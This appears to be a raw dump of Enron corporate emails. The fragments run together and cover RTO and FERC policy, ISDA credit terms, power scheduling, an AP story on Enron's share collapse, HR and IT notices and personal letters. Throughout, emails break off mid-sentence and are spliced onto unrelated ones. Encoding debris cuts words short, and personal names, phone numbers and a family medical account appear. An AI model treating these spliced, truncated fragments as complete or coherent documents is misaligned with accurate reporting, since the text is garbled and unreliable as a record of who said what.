1. Should Enron Oppose NG?

Yes a. Unclear about how much control NG has in the process (complete tariff 
control?).
 b. There are issues about NG independence from market (NE and NY assets).

No a. NG wants to be a Transco in the ultimate state.
 b. This is a mid-term solution that could work.
 c. If done right, better opportunity to deal with transmission issues than 
current structure.

RECOMMENDATION - Enron should file comments on key open policy issues with 
for-profit Gridco model.  

We don't oppose, but we are concerned that controls must be in place to 
ensure well functioning markets.
The Transco model is the best model for transmission operation.  If this 
action by NG leads ultimately to a Transco, it is a good outcome.
The operator of RTO tariff must be independent of all market players (NG owns 
generation and has distribution in New England).  Transelect wrote ""I believe 
quite strongly that FERC should deny this petition because the Grid is a 
significant owner of both distribution and generation assets in the Northeast 
(New England Electric and Niagara Mohawk).  It is a very small step from this 
decision to one that would allow Southern to operate GridSouth, or one that 
would allow Entergy to operate the Florida RTO in exchange for FP&L operating 
the Entergy RTO.  As a matter of National policy, transmission operators 
should be independent of either the wholesale or retail electric markets.  As 
a business issue, many transmission owners are reluctant to divest of 
transmission because they retain hope that their transmission can be used to 
protect above market native generation.  How would you like to try shipping 
power into the Northeast with the Grid, a major retail supplier and a 
significant generator, controlling access to the market?""  We  should make 
this argument very strongly.  NG must have a plan to divest itself of the 
generation and distribution side of the business because NE and NY are 
economically viable markets impacted by the Alliance RTO.
The Operator of RTO must have full authority to modify the tariff and 
operations of the RTO.  The Transmission Providers should not be able to 
restrict or limit in any fashion the for-profit Gridco Operator beyond 
ensuring (1) technical proficency, (2) assets returned in reasonable manner, 
and (3) recovery of FERC approved revenue requirement.","Wish

Some changes are appropriate regarding the Canada Gov't Affairs Group's use of Enron Canada support staff and the allocation of their salaries to the Gov't Affairs given things like Aleck's departure, Fino's use of support, etc. and the need to generally reduce costs:    

						Current Allocation			Proposed after Dec 1/01
Lisa Assaf - Toronto  				50% of $46,000/year			$0
Sara Butt - Calgary (Fino)			25% of $38,000/year			$0
Linda Sietzema - Calgary (Rob/Randy)		50% of $44,000/year			$0

Megan Scott - Calgary (Rob/Randy)							100% of $28,000/year		

This plan will reduce the Enron Canada support staff allocation to Gov't Affairs from its current level of $58,000/year to $28,000/year until end of Q1 2002 when I plan to put a new Gov't Affairs person in Toronto that will need some level of support (say 25% of $46,000).

Are you okay with this?  Please confirm and then I will proceed to have Enron Canada revise its present allocation to Gov't Affairs.

4702,"Just wanted to make sure you saw this from Les Rawson concerning Grays Harbor and Willamette.
-Bill

Beginning immediately Enron has purchased Control Area Reserves service from BPA. 

The allows Services to sell Unit contingent energy as hourly firm since BPA is suppling reserves for up to 60 Minutes. If Grays Harbor Paper notifies RT of a unit derate or outage RT should notify BPA dispatch immediately and make the reduction in the schedule during the next ramp. For example should Grays unit trip as 1333 RT would notify BPA and the sink that across the top of the hour for 1400 the schedule would be taken to zero for HE 1400. The bottom line is that 60 minutes is the maximum time BPA will carry the schedule.

Send me a e-mail concerning any reductions for Grays since the energy would need to be repaid back within 168 hours.

Also, for May Services sold 10 mw of UC energy to EWEB from Willamette all hours. As part of this sale Services bought 18 Mw of firm transmission from PACW to BPAT for all hours. 10Mw of this purchase will be used for the monthly sale with the remaining 8Mw used for day ahead and hourly sales. The Assignment Reference # 139990. The cost for this transmission is $2.72 per hour vs the $5.84 we normally pay for hourly non-firm so hopefully we can save some money on PAC transmission.

Also, beginning May 1 Services purchased Ancillary Services from PacifiCorp to allow Willamette's Unit Contingent energy to be sold as 1-hour firm with reserves. The procedure for dealing with inner hour cuts is similar to Grays with the exception of not calling PAC RT dispatch. Simply cut or reduce the schedule at the next ramp and note the derate in a e-mail to Services. This service adds .43 cents per Mw to the term sale costs. However, this service applies to Willamette's sales up to 30Mw.

Let me know if there are questions.

The following are the credit issues that they raised in their comments:

1. Cross default threshold - instead of $100,000,000 they want a 3% of equity 
test.

2. Credit Event Upon Merger - they want to delete the amendment language in 
our Schedule

3. MAC Trigger - this currently is an Event of Default.  They want to make it 
a Termination Event.  Also, they want to add to the trigger going below a 
Baa3 rating by Moody's.

4.  In the financial reporting section, they want to add on our side a 
requirement that we deliver to them any financial or business report that we 
make available to our shareholders or that we file with the SEC or bank 
regulatory authorities

5. In the Netting language, they have excluded FX and Currency Option 
transactions.

6. In the setoff language, they have limited the trigger to the designation 
of an Early Termination date because of the Termination Event Credit Event 
Upon Merger.  Alos, they want setoff to apply to ""matured and unmatured"" 
obligations.

7. They don't want a cap on the Enron Guaranty

8. In the Termination section where we specify Loss and Second method that 
have an interesting rider (insert 2) that modifies how the Second Method 
works.  I'm still trying to understand what this language does but it appears 
to qualify any payments on termination that the Non-Defaulting Party would 
have to make to the Defaulting Party.

I will send you a copy of their comments and hopefully we will talk to them 
about this next week.

I made a mistake on the language that we sent you on MAC.  On the last part 
where it talks about a failure to be rated, my understanding from our 
discussions is that a MAC would only be triggered if a party's credit support 
provider failed to be rated by either S&P or Moody's  so that if it lost one 
rating but maintained the other rating a MAC would not be triggered.  For 
this reason the amendment should read ...or its Credit Support Provider shall 
fail to have a rating from either S&P or Moody's. 

Please confirm that this is your understanding and sorry for the confusion.

I just got to open this up now.  Thanks for sending this and the card.  What 
a week it has been.  I'm happy to report that we are all home now and except 
for a lack of sleep, we are all doing well.  I ended up having Charles Eugene 
by C-section and then had to spend the next 5 days in the hospital while they 
tried to figure out why he was breathing erratically.  They ran all sorts of 
tests on him (including a spinal tap) and the good news is that he just had 
some fluid in his lungs which he didn't get rid of as part of the birthing 
process.  He is okay now and a true joy!  Arthur and Bill have been a big 
help.  It's nice to have someone around with me during the day.  Arthur 
visited my parents right before Charles was born and had a great time.  They 
spoiled him to death but I was thrilled that he made the trip there and 
wished we could do that more often.  As for me, I hope to take from now until 
the end of the year off from work and then decide what I want to do.  I'm 
looking forward to the extended leave even though most of it will be unpaid 
but it will be worth it and hopefully Charles will benefit from it.

How are things with you?  Have you seen the shore house?  It is quite a 
place.  I'm hoping that mom and sue will come for a visit in late August.  
Sue is Charles' godmother.

Well I need to get back to the baby.  stay in touch and thanks again for 
thinking of us.  Pictures will come soon.  Love, Carol

4727,"NERC is apparently moving forward aggressively on their initiative to restrict access to market information.  Doug Sewell, who participates on the MAIN Planning Committee, was on a call this morning in which members of MAIN and NERC's Virginia Sulzberger discussed ways to limit access to information.  A new disturbing angle was that apparently, some members indirectly alleged that marketers have ""higher turnover"" and ""loose lips,"" and were using this as a scare tactic to indicate why the information should be restricted (potentially even from legitimate consumers like us).

If I remember correctly, we were going to contact NERC to let them know our opinions on this issue.  It sounds like perhaps they are not being addressed sufficiently.  Doug has suggested we should being it up at the MAIN MIC meeting; do we want to begin a campaign to protect our access to this data?  I think that without getting more involved, this will be yet another industry ""de facto"" standard that is created under the assumption that silence is consent (even if we're not told about the changes).

4731,"SPP is joining MISO and today MISO said that the merger should be filed at FERC 1Q02.  MISO also told FERC that the same congestion management systems would be used in SPP/MISO, so no seams.  Since MISO is moving toward the market design we want, then really it seems that SPP should be implementing the MISO system for Day1 (which may well be up 12/15/01) and should be right in line with MISO on Day 2 issues (that we like).

However, FERC should not approve SPP as an RTO until it is in with MISO.  I don't see that FERC needs to approve SPP as an RTO in order to allow SPP to finish work on a wholesale energy system because presumably SPP will be using MISO's system.  This summer FERC told SPP to not spend more $ since it was not an RTO yet and it was going off on its own merry way.  Therefore, FERC could say ""use MISO's system and specify exactly the minimum that needs to be done on systems in order to have the TX retail settlements done.  This should be done consistent with the no seams, as represented by MISO.""  That should satisfy Texas PUC concerns.

4732,"Thanks, Guy.  Your point is valid; however, you are right that we don't want to emphasize the intra-day hourly part in this pleading since a firm power contract is necessary in order to have firm network service (hourly traders purchasing system contigent or unit contingent during the day would be scheduling the network transmission utilizing ""non-designated resource"", which makes the transmission less firm (right above non-firm PTP)).  ComEd's draft response also discusses this in the context that they are following the tariff.  The point we need to make is that the designation of firm LD contracts absolutely meets FERC's network resource requirements.

We have added an argument that, yet again, even having this type of issue with network, PTP, etc. emphasizes the need to move quickly to the market design that we advocate in the context of an RTO, which would eliminate these parochial issues (and without an icap obligation that Dynegy clearly wants.)

HOUSTON (AP) - Shares of embattled Enron Corp. plunged another 32 percent W=
ednesday morning as analysts and investors continued to doubt the once-migh=

.=20
In a report released Wednesday, Goldman Sachs & Co. analyst David Fleischer=
 became the latest to question Enron's future, saying that an SEC filing by=
 the Houston-based company earlier this week ""raised new issues about liqui=

Analysts are also questioning whether Dynegy Inc.'s planned dlrs 8.9 billio=

Enron shares fell 23 percent Tuesday, then dropped another dlrs 2.25, or 32=
 percent, to dlrs 4.74 Wednesday in extremely heavy trading on the New York=
 Stock Exchange.=20
Fleischer said Enron's Nov. 16 cash balance of dlrs 1.2 billion is inadequa=

Fleischer acknowledged, however, Enron's efforts to renegotiate next week's=
 due date for the dlrs 690 million debt, which was triggered Nov. 12 when t=
he company's credit rating was downgraded to BBB-, saying that there are in=
dications that Enron's banks may be willing to roll current maturities over=
 and even make new equity investments.=20
Michelle Foss, director of the Energy Institute at the University of Housto=

""It doesn't look like it's going to be able to happen,"" Foss said. ""It did =

I am pleased to announce the following changes in the Global Risk Management Operations organization: 

Bob Hall will lead operations for Enron Americas. Bob previously served as one of the business controllers for gas operations for Enron Americas, with direct responsibility for Gas Logistics and Volume Management.  The leadership team reporting to Bob will include Peggy Hedstrom (Calgary Operations), Jeff Gossett ( U.S. Gas Risk and South America Operations), Stacey White (U.S. Power Risk), Leslie Reeves (U.S. Gas and Power Confirmations and Settlements), and Bob Superty (U.S. Gas Logistics). 

Brent Price will continue to lead Operations for Enron Global Markets and fulfill his dual role as Chief Accounting Officer for Enron Global Markets. 

I am very pleased to announce that Kevin Sweeney will lead Operations for Enron Industrial Markets.  Kevin brings to his new role extensive risk and operations experience from stints in our Houston, London and Singapore offices.  Kevin fills the role that was previously held by Brenda Herod, who will now report directly to Beth Apollo. 

Beth Apollo will be the Operations Project Manager for the assimilation of EES Wholesale. This will include Deal Capture, Risk Analysis,  Confirmations, and Global Data functions which have been moved into EWS under Global Risk Management Operations.  Successfully leveraging the infrastructure to support the EES business plan will also require close coordination with Gas Logistics, Settlements and the Operational Analysis (OA) process, and Beth will actively coordinate operations efforts with these teams and the commercial teams.  I have asked Beth to project manage the effort to look for opportunities to streamline and improve systems, processes and controls, and to consider alignment, where it makes sense, with existing EWS processes.  Reporting to Beth will be Scott Mills, with a focus on Deal Capture, Risk Analysis and Confirmations, and  Brenda Herod, with a focus on invoicing control guidelines and reporting requirements. 

Beth will also continue to manage the Global Services function, which includes the consolidated DPR process and Global Operations Standards, led by Shona Wilson, and the Global Data function which is lead by James Scribner.

Mike Jordan will continue to lead operations for Enron Europe, working closely with me and other EWS operations leads to insure the proliferation of best operational practices worldwide for Enron.

4772,"I will check on this.  I may be incorrect in the 12/21 date based on the
following quoted response that I found.  I will get further clarification.
""In its November 1, 2000, Order, FERC outlined a series of flaws in the
California markets and proposed a number of measured designed to reform the
market.  One of such proposals what that the ISO modify its single price
auction ""so that bids above $150/MWh could not set the market clearing price
that is paid to all bidders and imposing certain reporting and monitoring
requirements for transactions and bids above the $150/MWh breakpoint.""
Pursuant to FERC's November 1 Order, the ISO filed Amendment 33 with FERC on
December 8, 2000, which was approved on the same day.  On December 15, 2000,
FERC issued an Order Directing Remedies for California Wholesale Electric
Markets, and further clarified its December 8, 2000 Order.

Pursuant to Amendment 33, effective December 8, 2000, FERC authorized the
ISO to set a ""soft"" bid cap for the purchase of real-time energy.  The order
specified that although the ISO would pay those entities bidding above the
soft cap as bid, all bids above the breakpoint would be are subject to
market refund following FERC's review of the bid data ""in order to ensure
just and reasonable rates"".  Effective December 12, 2000, FERC's order
authorized the ISO to assess the costs of real-time purchases above the soft
cap and allocate to SCs which under-schedule load the difference between the
interval MCP and the bid price above the soft cap bid prices to SCs which
underschedule load.  The ISO created CT 487 to accomplish this allocation.

Please see the following excerpt from the FERC December 15, 2000, order,
Docket No. EL00-95-000, et al:

""On December 8, 2000, the ISO filed Tariff Amendment No. 33 in Docket No.
ER01-607-000, seeking expedited consideration of tariff revisions to address
emergency reliability conditions.  The filing sought three modification of
the ISO's tariff: (1) immediate implementation of an interim price
mitigation proposal based on the breakpoint concept that was proposed in the
November 1 Order (at $250/MWh) to encourage greater participation of
generators in its markets; (2) provision of penalties on generators that
fail to respond to dispatch instructions during a system emergency, to
become effective December 8, 2000; and (3) allocation of the costs of
obtaining additional energy to Scheduling Coordinators who rely on the ISO's
real-time Imbalance Energy market, as an incentive to loads to purchase
energy in the forward markets.  The ISO requested an effective date of
December 12, 2000 for the third modification.

The commission approved the tariff revisions in an order issued December 8,
2000, with the effective dates requested by the ISO.""

After an extensive review, the ISO has concluded that the charges for
purchases above the soft cap break point (currently set at $150/mwh),
although high, are consistent with the filing approved by FERC.  FERC
continues to review the just and reasonableness of all bids dispatched in
our real-time market that are above the $150.00 breakpoint, and will order
market refund if the dispatched bid price is not found to be just and
reasonable.  The ISO continues to review this issue, and is considering
alternative allocation methods, which would continue to be consistent with
the tariff. ""

 	 ""Order On Rehearing Of Monitoring and Mitigation Plan For The
 	 California Wholesale Electric Markets, Establishing West-wide
Mitigation,
 	 And Establishing Settlement Conference."" 

 	The ISO is considering new processes for implementation of the
must-offer obligation that would permit compliance with the FERC's Order and
take into consideration the particular concerns of generating units with
long start-up times and operating costs that may not be fully recoverable
during periods of relatively low Energy prices.  As indicated in the ISO's
compliance filing in response to the FERC Order and as indicated by the ISO
during the ISO's Market Participant Conference Call on July 16, through this
Market Notice the ISO is providing notice of the following dates and
actions:

Monday, July 23, 2001:	The ISO will post on its Home Page a draft
 				implementation proposal on the
above-mentioned 
 				issue for review and comment;

Friday, July 27, 2001:	Written comments on the draft implementation
  				proposal are due;

Tuesday, July 31, 2001:	The ISO will post a revised draft implementation
 				proposal and, as appropriate, responses to
written
 				comments;

Thursday, August 2, 2001:   The ISO will hold a conference call with Market

Yesterday, 6/27/01 when we were in the meeting with Jay Lewis, you had a document which I believe contained a list of all of the issues to date.  I think you referenced the document as being something which was put together by Paige Grgrumulaitis.  Can you please forward myself & Chris Stokley a copy of that document.

In addition, it would be beneficial to these efforts if you could add us to any distribution lists which have already been established or will be established in the future  for scheduling meetings, distributing communications?  

It would be helpful if you could provide us with any documentation which we may have been previously distributed. We are looking for any documentation that references process and / or systems for EES current or future state.
I currently have two documents from the Gutenberg team:  
 1 - (""Gutenberg ""Is"" and ""Should"" cross-functional process maps"")
 2 - (""Gutenberg Calculation Engine Project - Phase I) dated May 25, 2001.  

There are many activities currently underway in this transition, and I am making these requests in hopes that we can prevent people from trying to reinvent the wheel or performing redundant activities.  

Any assistance you can provide would be greatly appreciated.

Just to recap from our meeting this morning.

Discussion Points
1.	The following personnel are familiar with the batch module
architecture:  Ress Young, Dickson Koo, and Rogers Herndon.
2.	On the IT side, the following personnel can assist with data
extraction/description from RPS:  Charles Alvarez (*main contact), Ed
Calderon, Scott Yergin.
3.	On the Origination side, Phil Laden is familiar with the creation of
batch modules.

Action Items
1. (Todd Taylor)  We should expect a listing of all the available data for
extract from RPS.  This list should be sent to all of the parties on this
email by end of day Friday.
2. (Power Team)  We will redefine the RPS extract list, including the
information reviewed in #1 and that discussed in our meeting this morning.
The data dump will be delivered at the latest Wednesday, but our target is
today.  Please send it in ZIP format to limit the size of the email.  Again,
please copy all of the parties on this email.  The redefined extraction list
will include the current listing of fields, plus information regarding the
following.  (Should Annie, Erin, and Steven finalize this request, and
forward it to you via email?)
	- penalty parameters
	- actual and contractual max/min usage amounts
	- the financial instrument of the deal
	- records for multiple utilities at one site, plus an indicator of
this for such records
	- the RPS unique identifier
	- the name of the curve used to mark the deal to market
	- rate combo ID
	- aggregation level of MWH ON/OFF, pvMWH ON/OFF, and MW ON/OFF
values
3. (Power Team)  We will contact Dickson Koo for a meeting to discuss the
batch modules.  This will allow us to understand what all the calculations
and details are that are uploaded to the RPS system, in addition to
providing for us some take-away copies of the batch modules.
4. (Power Team)  We will establish a protocol for backing up the Access
database on a daily (M-F) basis to the KPMG server.

                    Your Date of Migration is: May 23rd

  YOU WILL BE UNABLE TO SEND E-MAIL unless you take the following action:


Please go through your Notes email and clean out as many old/un-needed
email items as possible BEFORE your date of migration.? After you are
migrated to Outlook you will only be allocated 100MB of total Mailbox
space.?? If more than this amount of data is migrated to Outlook YOU WILL
NOT BE ABLE TO SEND E-MAIL until it is below the 100MB limit.? Cleaning up
your Notes email now will prevent this from happening to YOU.

Enron's messaging platform is migrating from Lotus Notes to Microsoft
Outlook 2000 worldwide.  You will be accessing Outlook for all of your
email functions.

WHY IS ENRON MIGRATING TO OUTLOOK 2000?

Many factors contributed to the decision to migrate from Lotus Notes to
Microsoft Exchange/Outlook.  The most prominent factors were:

?    Significant advantages to moving to a product that is more integrated
with current Enron apps (Windows 2000, Office and Internet Explorer)
?    More efficient Shared PC and Roaming User features
?    Improved support and integration for Palm/CE devices
?    Instant Messaging capabilities

WHAT IS BEING MIGRATED TO OUTLOOK 2000?

?    Email Messages.  From the date of your scheduled migration, the last
(30) thirty days of your Email will be converted for use in Outlook.
?    All your folders in Notes you use to store email messages in.
?    To Do Items
?    Journal Items
?    Calendar Entries dating from (1) one year in the past to (10) ten
years in the future will be converted.
?    Address Books, but NOT your Distribution Lists that you created.  You
will need to re-create these in Outlook.

Our storage proposal was signed last night, so Peoples is ready to go.  Tony 
is out of the office this morning, but Dave Wear can transact if the spread 
comes our way.  As discussed, we would like to buy 5 BCF physical fix price 
March and sell physical fix price May for flat.  We would consider buying 
some April if March can't be done for flat.  We will be watching the screen 
this morning, but let us know if you see an opportunity to transact.  I think 
there is a big incentive for Enron to get these hedges on, because I expect 
that Peoples will want to roll the hedges with market movement, which, of 
course, will also be at your bid/offer.  I hope to get a meeting set up  with

Dear Colleagues,

We know you have many questions about your new benefits plan, payroll issues and other changes that will occur over the next few weeks. Human Resources and Communications are preparing a thorough Q&A, which we will send to you tomorrow and will regularly update as more information is available. 

Meanwhile, please read the announcement below from Security about how you can obtain a new UBS Warburg access card that will allow you to enter our new office space after Friday.

I am confident that you share my enthusiasm about our new opportunity.  We look forward to working along side each of you in the coming days.

Access Cards

There will be a two-day transition for the new UBS Warburg access cards. Beginning Monday, February 11, access to the 5th and 6th floors of Enron Center South will require these new cards. UBS Warburg access cards can be picked up from 7 a.m. to 7 p.m. at the reception area on the 5th floor of Enron Center South on Thursday, February 7th ; Friday, February 8th ; and Monday, February 11. Enron Security will produce new access cards with existing photographs, then simultaneously issue the new and collect the old cards. Employees without UBS Warburg cards will be allowed into the Enron Center South building on Monday but will have to collect their new cards as soon as possible to gain access to the 5th and 6th floors.

Employees who fail to collect their new cards by 7 p.m. Monday will be required to contact Enron Security's general information number at 713-853-5360 to arrange to pick them up.

There will be security staff available at the pick up point on ECS 5 to help with any problems you might have.

It is suggested employees wear their access cards at all times while on the premise.

Accessible Areas - The new cards will allow UBS-W employees to enter:
5th & 6th floors and Plaza area of Enron Center South , 
The Sky Ring 
Body Shop, Enron Center North Plaza and therefore access the Credit Union and Cafeteria from either building.

Restricted Areas - Employees must submit to Enron Security a Restricted Access Request form (available by calling 713 8535360 ) and signed by Bob McAuliffe (713-853-7468) to enter:
Enron Center South, 8th and 9th floors
Enron Center North, 22nd and 34th floor 
Ardmore Data Center.

Employees staying with the Enron estate while visa and other issues are completed - Employees in this group who are on assignment arrangements to UBS-W will be issued a regular access card - available in the same way as other new UBS-W employees.

Estate employees who are working with UBS-W on transition issues  - If they will be based in UBS-W office space they should talk to their UBS-W counterpart for approval and then UBSW HR for the issue of a UBS-W contractor card (in addition to their regular Enron badge). ","David Oxley

4814,"Due to current business circumstances, on November 28, 2001, Enron's Board of Directors adopted an amendment to the Enron Corp. Savings Plan.  The amendment includes the following changes, which became effective on November 29:

?	Savings Plan contributions that are deducted from your November 30 paycheck will be matched by Enron in cash rather than Enron stock.  The cash match will be placed into the Fidelity Freedom 2000 fund, the default fund for the Plan.  

?	After November 30, Enron will no longer match your savings plan contributions.  As an exception, the company will continue the union matching contributions to the Plan.

?	The Savings Plan has always permitted employees to place their contributions in Enron stock or one or more alternative investment options.  Effective immediately, diversification within the Plan will ALSO be allowed, regardless of your age, from COMPANY contribution accounts.  This removes the restriction for all employees under the age of 50 to diversify the company contributions held in their account.  These accounts include all prior company contributions, QNEC, and company match accounts.  

To move funds:
On the Web, choose ""Savings Plan--Restricted Employer Acct Transfer/Reallocation"" from the drop down menu.
On Voice Response, choose ""request for fund transfer/reallocation of your restricted employer accounts.""
This will allow you to move money from the four formerly restricted accounts: Company Matching, Union Matching, Prior Matching, and QNEC.

e-mails in the morning. Thanks for dropping the note, even if it was just a 
covert ploy to get me to deprive your enemies of their electricity. And by 
the way, if I could do that, you can bet we would have already had rolling 
black-outs in strategically placed Portland neighborhoods.

Yes, I did finish the book. It was very interesting, although it did lose me 
for awhile in the middle. It's a super-fast read, so I'm going to send 
another book along with it called ""Liar's Poker."" I just heard about it and 
it's supposed to be hilarious - an account of the boom and doom of Wall 
Street in the 1980s. I know, I know - Corporate America has taken its 
stranglehold on me, and pretty soon I'll be reading the stock market quotes 
for FUN! But just give it a chance; it's something a little different.

No, Anna did not give me the fair chance I deserved to get ""Heartbreaking 
Work..."" She is clearly a tramp. I will be procuring that book for myself 
later today, as I do not see any time in the near future when Anna will come 
to her senses and quit being evil.

Anyway, I've got to go control the world's electricity supply now. (This

3. Should confirmation status be ""NO""?

I believe the answer to all of these is yes, but I wanted to check before 
changing anything. The confirms group is getting extra sensitive about deals 
marked for confirmation, since they are now confirming all daily deals. Just 
a reminder to double-check your default settings and your deals for the

4837,"Greetings from the land of watery-eyed, flat-assed office workers! How goes 
the burly mountain man thing? I've been hearing second hand from Elliot that 
you're faring extremely well mentally despite some poorly crafted sleeping 
bags and a bad case of frostbite on your toes. (That second part I made up, 
but it sounded appropriate given the sleeping bag situation.) All's well 
here. As you could imagine, and probably often do, the sweeping expanse of 
people staring at computers that is Enron has changed not at all since you 
left. There are still many computers, many of them have changed positions, 
some have gone away, most we are not sad to see go. That's just the nature of 
this cutthroat business. Also on the stagnantly invariable list is the status 
of my life in relation to Enron. I am still here. I still stare at the 
computer. Every once in awhile I meander over to the dark window-less corner 
that enshrouds the IT wizards and ask them silly questions like, ""What does 
it mean when I hit this button and my screen starts flashing at me like a 
disco ball, then makes this awkward shrieking noise and finally goes black?"" 
They are incredibly helpful. I am still pretty much clueless about most 
things, although I've learned to talk about them with a semblance of 
authority, as in, ""No, you twit, the 25 megawatt off peak deal should clearly 
be flowing across SP-15 to NP-15 because of the illiquidity of SP's market 
right now. What kind of idiot wouldn't hedge their position in California at 
a time like this?"" It all sounds very exotic and important to me, which is 
why I'm still here. But I'm infinitely jealous of your wild exploits in the 
great American outdoors. I suspect my forbearance for sitting in an office 
will run out right around the middle of the summer, so I'm planning a trip to 
coincide with that meltdown. I haven't decided between a road trip through 
the western United States or just a direct flight to Paris. Both sound good, 
and way beyond my budget, therefore equally attractive. Well, I've managed to 
say practically nothing for long enough now. I do hope you're having an 
amazing time, rambling on toward the next crazy adventure on the horizon as I 
believe Jack Kerouac once wrote. We're all very proud of you here and 
constantly refer to you as ""my good friend Winston who's skiing across the 
state of Wyoming, which was my idea."" I'd love to hear about your trip direct 
from the source, although I know you're extremely busy out there, skiing and 
killing wild animals for sustenance and whatnot. But please do write 
back....if you can still move your fingers.

Sincerely,
Kate

4842,"Good afternoon, IT Wizards -

I'm curious about a feature on the new Forward Obligation Report. It is now 
possible to run the report showing term, scheduled, or liquidated deals. In 
the past I've always run the report showing term deals, then entered my 
desk-to-desk deals from those numbers. Now I believe the report is designed 
to pull data from our scheduling database, so I'm wondering what the 
difference is between the term deal report and the scheduled deal report. 
Each produce completely different numbers! Please let me know when you get a 
chance.

was clicking an SP-15 trade, and called immediately afterward to ask Chris if 
it could be adjusted. It was more lucrative for Chris to do this deal at 
SP-15 than NP-15 anyway, so he agreed. I guess I'm unclear about the exact 
EOL guidelines in a situation like this, but please let me know if there's 
anyone you'd like me to talk to. Chris didn't have the trader's name offhand,

$15.00 flat fee change for 1 or 2 days deals.  Currently this can't be coded 
based on the duration of these deals because we currently have a code for 
daily deals(meaning 1 day only) and a code for short term deals ( meaning 
anything 1 day or more but less than 1 month) and a code for long term deals 
(meaning anything more than 1 month).   If the fee was per mw, I could simply 
go and edit the broker table fee but since this is a flat fee, the codes have 
to be adjusted to reflect such.

4851,"I just entered an index deal for one of our traders, and came across 
something I hadn't noticed before. In EnPower, we have several choices for 
the Dow Jones Mid-Columbia index, but none called specifically ""Mid-C Firm 
Peak."" We have non-firm peak, and something called ""Mid-Columbia Index."" 

I'm just wondering how to specify that I want the deal to settle against the 
Dow Jones Mid-C PEAK index. In this case, because I was entering a 
round-the-clock (all hours, all days) deal, I had to enter three different 
deals to specify the three different indices - Mid-C Peak, Mid-C Off Peak, 
and Mid-C Sundays and Holidays. But I don't see a Mid-C Peak choice, so I 
entered the first as Mid-C Index.

Deal numbers are:
597244 - Peak
597245 - Off Peak
597246 - Sundays/Holidays

I just wanted to ask because when you guys plug the index prices in here I 
want to make sure that ""Mid-C Index"" gets the peak price. Could you let me 
know if it doesn't? And if that's the case, then I'll need to have another 
pub code set up for peak price.

Thanks for your help on this. Please let me know if you have any questions.

4862,"Car Rental Options for Enron Travelers

Rental car contracts for 2001 have been awarded to:

National Car Rental (Primary) and  Alamo Rent-A-Car (Secondary).  

The intent of these agreements is to consolidate and leverage Enron's total 
car rental spend to achieve the most favorable rates and non-pricing 
provisions (i.e. insurance).

National Car Rental, due to its service levels, availability and total value 
proposition, has been awarded Primary status and is recommended as the first 
choice for Enron travelers' needs.

Alamo Rent-A-Car, a sister company to National, has been awarded a contract 
reflecting a Secondary status, due to its service levels, availability and 
low cost solutions.  Alamo is recommended as an alternative to National, 
where available.

When you rent a vehicle in the United States, (including Puerto Rico) or 
Canada, the following insurance provisions are included, regardless of rate 
selected: 
1. L/DW (Loss/Damage Waiver) - This is what is called Comprehensive or 
Collision on your personal auto. It covers the rental vehicle and pays for 
any damage to it. 
2. Liability - This covers people and property outside the rental vehicle. 
For both National and Alamo, the coverage is $100,000 per person, $300,000 
per occurrence and $50,000 for property damage. 
** IMPORTANT ***
These coverages apply regardless of rate selected, as long as the following 
contract ID is communicated at the time of reservation and rental is recorded 
on the transaction rental agreement.  (National -  5000838 Alamo    - #143974)

To enjoy the highest levels of service while renting a vehicle from Enron's 
preferred suppliers, it is recommended that each traveler enroll in 
National's and Alamo's preferred traveler programs.  National's Emerald Club 
membership and Alamo's Quicksilver program are designed to speed the 
transaction time by providing services such as counter bypass and rapid 
return.  The enrollment fees for these programs have been waived for Enron 
travelers.  Enrollment packets will be mailed to the addresses of Enron 
American Express T&E Cardholders.  You may also find an enrollment form on

unprecedented crisis.? Blackouts, credit crunch, electric and gas price 
volatility, low hydro levels--? and we're not even near the summer.?? What 
are we facing??

Now is the time to think, to plan, to solve tomorrow's problems before they 
arise.?? Join us at the Power Marketing Association's Seventh Annual Spring 
Meeting: Power Markets 2001: CRISIS AND OPPORTUNITY:? MARCH 14-16, 2001,

Crisis grabs the attention, but the opportunities are almost palpable.? Just 
click on the headline for the full story at powermarketers.com:

The Bonneville Power Administration's (BPA) decision to solicit proposals

""major breakthrough"" for the increasingly-competitive clean energy 
technology, the Washingon, D.C.-based American Wind Energy Association?

THE POWER OF PEAK SHAVING -- and LIFE-CYCLE COSTING
With peak-demand-controlled rates, businesses can realize as much as a 
60-percent discount on monthly demand charges if they agree to reduce the 
electric power demand to a predetermined level when the utility imposes a 
control period.

A POWER GRAB BY POLITICIANS
...Where power plants were to be built, or where high-voltage lines would be 
strung, might well depend on who could, and could not, bring political 
influence to bear, rather than what the system needed to work efficiently. 
...With the threat of further blackouts looming, legislation is being drafted 
to designate which customers will suffer and which will not -- ?Should 
farmers be cut off, or biotechnology facilities, or computer chip plants, or 
schools?

I entered these deals for Mike Swerzbin yesterday, but he gave me an

Then Cara Semperger, in Scheduling, went in to change the delivery point and 
felt that the deal should be combined into one with three legs instead of 
three separate deals. 

So, in the end, she killed 597244 and 597245, and added two legs to 597246.

total megawatts accordingly. This could end up taking awhile, and I'm not 
sure the effect would be worth it. Again, let me know if you agree, because 
I'd like this report to be as applicable as possible.

2. I will run the EnPower deal count, excluding EES deals. I'll compare this 
count to the original one to determine how many EES deals were done by each 
desk, then double that number - to account for both sides of the sleeve - and 
subtract. I'll enter the altered numbers into the graph, which should produce 
a more accurate rendering of the day's activities.

I think I made it sound more complicated than it is. Bottom line, this should 
solve the EES sleeve dilemma with little ado.

4914,Please order a flat screen monitor for me.,,,
4915,"Here are some early drafts I worked on.
",,,
4916,"To All -

I am working on a Net Works project called CommodityLogic - an internet based 
product which can be used to provide financial and logistical solutions for 
commodity transactions.  The basic use of the product is to assist mid and 
back office personnel with the completion of transaction details such as 
confirmations, nominations and invoice reconciliations.

At the current time, the project is moving forward with four or five modules, 
each focused on a different aspect of mid and/or back office operations.  The 
module of primary concern (from a ""legal buy-in"" standpoint) is a module 
entitled ConfirmLogic.   

The basic idea behind this module is to enable counterparties to a commodity 
transaction to complete the confirmation process electronically through an 
electronic matching system - matching information obtained from both parties 
to the transaction.  If the information matches, the CommodityLogic concept 
is that no further action will be required by either party to confirm the 
transaction.  If information is ""published"" to CommodityLogic by only one 
party to a transaction (such that the automatic matching function is not 
activated), the other party my manually within the electronic module match or 
confirm the transaction information by clicking on the appropriate button 
within the module, thereby confirming the transaction information and 
alleviating the need for any further confirmation action between the parties.

This system will present the opportunity to move away from written 
confirmations and enable both parties to a transaction to accomplish the same 
manner of confirmation electronically.  Whether or not this will be an 
acceptable legal method of confirming transactions within the Enron 
environment is the key question I have been asked to address with each of you 
relative to your specific trading areas.  Accordingly, I am going to be 
setting up a meeting later this week to discuss the project in a bit more 
